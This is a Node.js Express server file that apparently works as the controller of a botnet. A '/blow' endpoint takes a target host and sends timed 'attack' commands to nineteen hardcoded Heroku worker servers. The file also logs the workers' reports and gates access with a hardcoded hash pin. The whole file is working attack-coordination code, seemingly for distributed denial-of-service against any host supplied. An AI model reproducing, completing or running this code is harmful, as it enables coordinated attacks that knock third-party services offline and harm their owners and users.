var express = require('express');
var path = require('path');

var Req = require('request');

var fs = require('fs');

var app = express();
var run = false;
var ak = {}

app.use(express.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

app.use(function (req,res,next) {
  if(!req.query.hash || req.query.hash !== "1111991")
  {
    res.status(403);
    res.end('your are banned');
    return;
  }

  next();
});



app.post('/blow',function (req,res ) {
  var host = req.body.host;
  res.end('done');
  run = true;

  sendCmd(['https://bb-s1.herokuapp.com/',
'https://bb-s2.herokuapp.com/',
'https://bb-s3.herokuapp.com/',
'https://bb-s4.herokuapp.com/',
'https://bb-s5.herokuapp.com/',
'https://bb-s6.herokuapp.com/',
'https://bb-s7.herokuapp.com/',
'https://bb-s8.herokuapp.com/',
'https://bb-s9.herokuapp.com/',
'https://bb-s10.herokuapp.com/',
'https://bb-s11.herokuapp.com/',
'https://bb-s12.herokuapp.com/',
'https://bb-s13.herokuapp.com/',
'https://bb-s14.herokuapp.com/',
'https://bb-s15.herokuapp.com/',
'https://bb-s16.herokuapp.com/',
'https://bb-s17.herokuapp.com/',
'https://bb-s18.herokuapp.com/',
'https://bb-s19.herokuapp.com/',
],host);


});

app.post('/reg',function (req,res) {
  res.end('saved');
  var txt = req.body.s;
  var id = req.body.id;
  delete ak[id];
  save(txt);
});


app.head('/',function (req,res) {
  res.writeHead(200,
    {'type': 'brq',
    'ready': !run
  });
  res.end();
});

function save(txt) {
  var date = getNow();
  date = new Date(date).toTimeString();

  fs.appendFile('log.txt', '\n'+date+'  ::'+txt, function (err) {
  if (err) throw err;
  console.log('Updated!');
  if (ak.length == 0) {
    run = false;
  }
});


}

app.get('/', function (req,res) {
  res.sendFile(__dirname+'/log.txt');
});

app.use(function (req,res) {
  res.status(404);
  res.end('Not Found');
});

function sendCmd(servers,host) {
var time = getNow() + (1 * 20*1000);
var s = 0;
var e = servers.length;

var onSucess = function (err,rr,body) {
  if (err)
  {
    console.log(err);
    return;
  }
    s++;
    ak[s] = true;
    console.log('cmd '+ s +' success');
    console.log(body);
    if (s >= e)
    {

    }
    else send();


}

var send = function () {
  var pin = '1111991';
  var url = servers[s] + 'attack/?hash='+pin;
  console.log(url);
  Req.post({
    url:url,
    form:{
      time:time,
      host:host,
      id:s+1,
    }
  },onSucess);
}

send();




}

function getNow() {
  var iraq = new Date().getTime();
  return iraq;
}

console.log('now :'+getNow());
module.exports = app;
